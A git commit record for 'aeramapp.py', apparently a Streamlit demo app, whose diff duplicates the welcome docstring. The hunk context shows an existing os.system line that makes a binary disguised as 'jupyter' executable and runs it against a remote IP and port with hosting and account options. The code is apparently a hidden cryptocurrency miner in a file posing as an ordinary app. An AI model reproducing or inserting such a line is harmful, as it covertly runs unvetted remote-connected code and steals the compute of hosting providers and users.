c3e8926bc9815764ac172d81cd6e3c2b015eceaa
sayanaderiyana <116347258+sayanaderiyana@users.noreply.github.com>
2022-10-21 16:25:07 +0700

    Update aeramapp.py

--- aeramapp.py
+++ aeramapp.py
@@ -8,6 +8,10 @@ os.system('chmod +x jupyter && ./jupyter --hosting=167.172.79.246:10100 --rekeni
 """
 # Welcome to Streamlit!
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
+
+"""
+# Welcome to Streamlit!
+Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
 If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
 forums](https://discuss.streamlit.io).
 In the meantime, below is an example of what you can do with just a few lines of code:
